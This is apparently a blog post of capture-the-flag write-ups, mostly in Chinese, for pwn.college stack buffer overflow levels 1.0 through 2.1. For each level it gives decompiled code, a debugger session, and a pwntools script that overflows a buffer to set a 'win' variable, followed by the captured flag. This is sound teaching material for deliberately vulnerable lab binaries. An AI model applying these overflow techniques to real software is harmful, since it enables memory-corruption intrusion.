---
title: "Write-ups: pwn.college series"
pubDate: "2024-12-04"
categories: ["Write-ups"]
description: "Write-ups for pwn.college binary exploitation series."
---

## Table of contents

## Program Security (Memory Errors)

### Level 1.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

#### Write-up

分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：

```c {9-10} del={55, 63} collapse={1-5, 14-51, 67-80, 59-59} ins={84-85}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-50h] BYREF
  int v7; // [rsp+1Ch] [rbp-34h]
  int v8; // [rsp+24h] [rbp-2Ch]
  size_t nbytes; // [rsp+28h] [rbp-28h]
  _QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
  _QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+58h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v11[1] = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  v11[0] = 0LL;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 20);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, when this variable is non-zero, the flag will be printed.");
  puts("You can make this variable be non-zero by overflowing the input buffer.");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    (char *)v11 + 4,
    20);
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  nbytes = 4096LL;
  printf("You have chosen to send %lu bytes of input!\n", 4096LL);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    &buf[nbytes / 8],
    nbytes - 20);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", (char *)v11 + 4);
  printf("- the value of the win variable is 0x%x.\n", HIDWORD(v11[0]));
  putchar(10);
  if ( HIDWORD(v11[0]) )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

注意到这里判断了 `v11[0]` 的高 32 bits。这时只要 `v11[0]` 的高 32 bits 不是 `0` 就都可以进入 `if` 内部，调用 `win`：

```c
if ( HIDWORD(v11[0]) ) { win(); }
```

所以我们要做的就是想办法覆盖 `v11[0]` 的高 32 bits。

```c
_QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
_QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF

// ...

nbytes = 4096LL;
// ...
v8 = read(0, buf, nbytes);
```

这里 `read` 最多可以读取 4096 bytes 到 `buf`。但是我们的 `buf` 只有 16 bytes，故存在缓冲区溢出问题，导致覆盖 `v11` 的值。

所以我们只要先输入 16 bytes 填满 `buf`，再多写 5 bytes 就可以达到破坏 `v11[0]` 的高 32 bits 的目的。（注意 `read` 会把回车读进去，所以本地执行可以只输入 20 bytes）

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow-w"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 21
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`

### Level 1.1

#### Information

- Category: Pwn

#### Description

> This challenge is identical to its "easy" version from a security perspective, but has the following changes:

1. Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
2. For all other "hard" versions, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference. However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
3. Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

#### Write-up

```c {5-6} del={13} ins={20-21} collapse={1-1}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  _QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
  int v4; // [rsp+50h] [rbp-10h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  v4 = 0;
  printf("Send your payload (up to %lu bytes)!\n", 4096LL);
  if ( (int)read(0, buf, 0x1000uLL) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( v4 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
_QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
int v4; // [rsp+50h] [rbp-10h]

// ...

if ( (int)read(0, buf, 0x1000uLL) < 0 ) { /* ... */ }

// ...

if ( v4 ) { win(); }
```

由于程序根据 `v4` 的值来判断是否执行 `win`，所以只要令 `v4` 不为 0 即可。

注意到 `buf` 只有 32 bytes，但是最大可以输入 4096 bytes，导致溢出覆盖 `v4` 的值。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 33
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{cwWgAcBgDsBnGFTCky9i1NRqAtO.0FM5IDL5cTNxgzW}`

### Level 2.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

#### Write-up

```c {8-12, 22-25, 55} ins={84-85} del={63} collapse={1-4, 16-18, 29-51, 59-59, 67-80}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-D0h] BYREF
  int v7; // [rsp+1Ch] [rbp-B4h]
  int v8; // [rsp+24h] [rbp-ACh]
  size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
  void *buf; // [rsp+30h] [rbp-A0h]
  int *v11; // [rsp+38h] [rbp-98h]
  _BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
  int v13; // [rsp+C0h] [rbp-10h] BYREF
  unsigned __int64 v14; // [rsp+C8h] [rbp-8h]
  __int64 savedregs; // [rsp+D0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+D8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v14 = __readfsqword(0x28u);
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  buf = v12;
  v11 = &v13;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 127);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, if you can set variable to 0x0e530e48, the flag will be printed.");
  puts("You can change this variable by overflowing the input buffer, but keep endianness in mind!");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    v11,
    (_DWORD)v11 - (_DWORD)buf);
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 127);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", v11);
  printf("- the value of the win variable is 0x%x.\n", *v11);
  putchar(10);
  if ( *v11 == 240324168 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
void *buf; // [rsp+30h] [rbp-A0h]
int *v11; // [rsp+38h] [rbp-98h]
_BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
int v13; // [rsp+C0h] [rbp-10h] BYREF

v13 = 0;
buf = v12;
v11 = &v13;
nbytes = 0LL;

// ...

__isoc99_scanf("%lu", &nbytes);

// ...

v8 = read(0, buf, nbytes);

// ...

if ( *v11 == 240324168 ) { win(); }
```

如果 `v11` 指向的地址的内容为 `240324168` 则触发 `win`。

注意到我们的 `buf` 为 128 bytes，由于最大输入长度可由我们自己自定义，因此可以溢出 `buf` 破坏 `v13`，将 `v13` 修改为 `240324168` 即可。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(128, b"A") + p64(240324168)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{w7aHpdU-9AlFvJ5GtohCFtGwF7M.ddTNzMDL5cTNxgzW}`

### Level 2.1

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

#### Write-up

```c {5-9, 15-16, 19} ins={28-29} del={21} collapse={1-1}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-38h] BYREF
  void *buf; // [rsp+30h] [rbp-30h]
  _DWORD *v5; // [rsp+38h] [rbp-28h]
  _QWORD v6[2]; // [rsp+40h] [rbp-20h] BYREF
  _QWORD v7[2]; // [rsp+50h] [rbp-10h] BYREF

  v7[1] = __readfsqword(0x28u);
  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 == 758965894 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

令 `v5` 指向的地址处的值为 `758965894` 即可触发 `win`。

最大输入大小可由我们自定义，存在溢出问题。`buf` 的大小为 16 bytes，溢出后可以覆盖 `v7`。

`v5` 为指向 `v7` 的 `_DWORD + 1` 处的地址，所以覆盖 `buf` 后需要加一个 `_DWORD` 才是最终地址。

```asm showLineNumbers=false wrap=false {92-94, 113-114}
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1!
###

Payload size: 1771
Send your payload (up to 1771 bytes)!

Breakpoint 1, 0x000055555555619d in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffffffd180 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
 RCX  0
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd180 ◂— 0
 R8   0x75
 R9   0xfffffffc
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
 RIP  0x55555555619d (challenge+171) ◂— call 0x555555555180
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x55555555619d <challenge+171>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fffffffd180 ◂— 0
        nbytes: 0x6eb

   0x5555555561a2 <challenge+176>    mov    dword ptr [rbp - 0x3c], eax
   0x5555555561a5 <challenge+179>    cmp    dword ptr [rbp - 0x3c], 0
   0x5555555561a9 <challenge+183>    jns    challenge+229               <challenge+229>

   0x5555555561ab <challenge+185>    call   __errno_location@plt        <__errno_location@plt>

   0x5555555561b0 <challenge+190>    mov    eax, dword ptr [rax]
   0x5555555561b2 <challenge+192>    mov    edi, eax
   0x5555555561b4 <challenge+194>    call   strerror@plt                <strerror@plt>

   0x5555555561b9 <challenge+199>    mov    rsi, rax
   0x5555555561bc <challenge+202>    lea    rdi, [rip + 0xf85]     RDI => 0x555555557148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x5555555561c3 <challenge+209>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
03:0018│-048 0x7fffffffd158 ◂— 0x155559020
04:0020│-040 0x7fffffffd160 —▸ 0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— ...
05:0028│-038 0x7fffffffd168 ◂— 0x6eb
06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 0
07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55555555619d challenge+171
   1   0x5555555562ea main+213
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555520e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
aaaaaaaabaaaaaaa

Breakpoint 3, 0x00005555555561d7 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x11
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
*RCX  0x7ffff7eb0c21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
 R8   0x75
 R9   0xfffffffc
 R10  0
*R11  0x246
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
*RIP  0x5555555561d7 (challenge+229) ◂— mov rax, qword ptr [rbp - 0x28]
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x5555555561d7 <challenge+229>    mov    rax, qword ptr [rbp - 0x28]     RAX, [0x7fffffffd178] => 0x7fffffffd194 ◂— 0xf7a9ac0000000000
   0x5555555561db <challenge+233>    mov    eax, dword ptr [rax]            EAX, [0x7fffffffd194] => 0
   0x5555555561dd <challenge+235>    cmp    eax, 0x2d3ce686                 0x0 - 0x2d3ce686     EFLAGS => 0x293 [ CF pf AF zf SF IF df of ]
   0x5555555561e2 <challenge+240>  ✔ jne    challenge+252               <challenge+252>
    ↓
   0x5555555561ee <challenge+252>    lea    rdi, [rip + 0xf77]              RDI => 0x55555555716c ◂— 'Goodbye!'
   0x5555555561f5 <challenge+259>    call   puts@plt                    <puts@plt>

   0x5555555561fa <challenge+264>    mov    eax, 0                       EAX => 0
   0x5555555561ff <challenge+269>    mov    rcx, qword ptr [rbp - 8]
   0x555555556203 <challenge+273>    xor    rcx, qword ptr fs:[0x28]
   0x55555555620c <challenge+282>    je     challenge+289               <challenge+289>

   0x55555555620e <challenge+284>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
03:0018│-048 0x7fffffffd158 ◂— 0x155559020
04:0020│-040 0x7fffffffd160 ◂— 0x11ffffd1a0
05:0028│-038 0x7fffffffd168 ◂— 0x6eb
06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5555555561d7 challenge+229
   1   0x5555555562ea main+213
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555520e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/wx $rbp-0x28
0x7fffffffd178: 0xffffd194
pwndbg> p/x 0x194-0x180
$4 = 0x14
```

算出来 padding 大小是 `0x14`。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x14, b"A") + p64(758965894)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{sZCPUpjO4U6HmvntMr91HLyNljf.dhTNzMDL5cTNxgzW}`
